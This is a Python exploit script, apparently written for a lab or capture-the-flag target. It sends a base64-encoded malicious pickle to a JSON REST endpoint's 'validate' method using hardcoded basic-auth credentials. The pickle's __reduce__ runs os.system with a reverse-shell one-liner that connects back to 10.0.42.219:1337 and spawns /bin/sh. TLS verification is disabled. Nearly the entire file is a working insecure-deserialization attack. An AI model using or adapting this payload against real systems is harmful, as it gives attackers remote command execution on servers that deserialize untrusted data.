#!/usr/bin/env python
import os
import pickle
import base64
import json
import requests

# Suppress the annoying requests HTTPs warning
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings (InsecureRequestWarning)

serverIp = "10.0.42.1"
#serverIp = "127.0.0.1"
serverPort = 65535
serverUrl = "json"
user = "iot"
password = "GimmePickle0x42"
reverseIp = "10.0.42.219"
#reverseIp = "127.0.0.1"
reversePort = 1337


# Attacker prepares exploit that application will insecurely deserialize
class exploit (object):
	def __reduce__(self):
		return (os.system, ("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" % (reverseIp, reversePort),))


# Class containing all REST API functions
class restApi ():
	url = None
	auth = None
	headers = {}
	result = None
	resultJson = None
	cookies = []

	# Init the api_request object with an url
	def __init__ (self):
		pass


	# Set the request's URL
	def setUrl (self, url):
		self.url = url


	# Set auth for the request
	def setAuth (self, usr, pwd):
		value = usr + ':' + pwd
		value = value.encode('base64').replace ('\n', '')
		self.headers['Authorization'] = 'Basic ' + value


	# Add a custom header to the query
	def setHeader (self, key, value):

		if (key not in self.headers):
			self.headers[key] = value

	# Send the POST request and retrieve the result as JSON
	def post (self, payload):

		# Convert the nested dict payload into a proper JSON payload
		jsonPayload = json.dumps (payload)

		# If a session cookie has been saved, use it instead of Authorization HTTP header
		if (self.cookies):

			if ( 'Authorization' in self.headers):
				del self.headers['Authorization']

			self.result = requests.post (self.url, headers=self.headers, cookies=self.cookies, verify=False, data=jsonPayload)

		else:
			self.result = requests.post (self.url, headers=self.headers, verify=False, data=jsonPayload)

			if (self.result.cookies):
				self.cookies = self.result.cookies

		try:
			self.resultJson = json.loads (self.result.content)

		except ValueError:
			print ("[!] [common]\tError during JSON result parsing")


	# Print the request result
	def printRes (self):
		print (json.dumps (self.resultJson, sort_keys=True, indent=4, separators=(',', ': ')))






if __name__ == '__main__':
	# Initiate API object
	apiRequest = restApi ()
	apiRequest.setHeader ('User-Agent', 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0')
	apiRequest.setHeader ('Content-Type', 'application/json')

	# Set the API base URL
	urlBase = "https://%s:%i/" % (serverIp, serverPort)
	# And the BASIC auth
	apiRequest.setAuth (user, password)
	url = urlBase + serverUrl
	apiRequest.setUrl (url)

	# Serious business
	exploit0 = exploit ()
	payload = pickle.dumps (exploit0)
	payloadB64 = base64.b64encode (payload)
	payloadJSON = {"method": "validate", "payload": payloadB64}

	apiRequest.post (payloadJSON)
	apiRequest.printRes ()
